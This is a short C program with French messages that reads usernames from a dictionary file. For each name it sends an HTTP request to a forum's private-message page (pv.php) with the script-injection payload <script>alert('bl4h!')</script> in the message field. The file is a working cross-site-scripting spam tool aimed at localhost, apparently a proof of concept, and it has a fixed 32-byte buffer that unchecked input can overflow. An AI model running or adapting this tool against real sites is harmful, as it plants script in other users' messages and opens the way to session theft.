#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>

#define DICO_PATH "dico.txt"
#define HOST "localhost"

int main(int argc,char *argv[])
{
    FILE *in;
    char requete[1024];
    int sock;
    struct sockaddr_in addr;
    struct hostent *hp;
    char mot[32];
    char c;
    unsigned int i;

    if((hp=gethostbyname(HOST))==0)
    {
        printf("Impossible de trouver %s.\n",HOST);
        return -1;
    }

    bcopy((char*)hp->h_addr, (char*)&addr.sin_addr, hp->h_length);
    addr.sin_family=hp->h_addrtype;
    addr.sin_port=htons(80);

    if((sock=socket(AF_INET, SOCK_STREAM, 0))==-1)
    {
        perror("Pb socket()");
        return -1;
    }
	
    if((connect(sock,(struct sockaddr*)&addr,sizeof(addr)))!=-1)
    {
        printf("La connexion a ete etablie.\n");
        if(!(in=fopen(DICO_PATH, "r")))
        {
            perror("Ouverture dico.\n");
            close(sock);
            return -1;
        }
        i=0;
        while(!feof(in))
        {
            fread(&c,1,1,in);
            if(c=='\n')
            {
                mot[i]='\0';
                i=0;
                sprintf(requete,
                        "GET /forum/pv.php?login=%s"
                        "&message=<script>alert('bl4h!')</script> HTTP/1.1\n"
                        "Host: %s\n"
                        "Connection: Keep-Alive\n\n",
                        mot,
                        HOST);
                send(sock, requete, strlen(requete), 0);
            }
            else
            {
                mot[i]=c;
                i++;
            }
        }
        fclose(in);
        sprintf(requete,"GET / HTTP/1.1\n"
                "Host: %s\n"
                "Connection: close\n\n",
                HOST);
        send(sock,requete,strlen(requete),0);
    }
    close(sock);
    return 0;
}
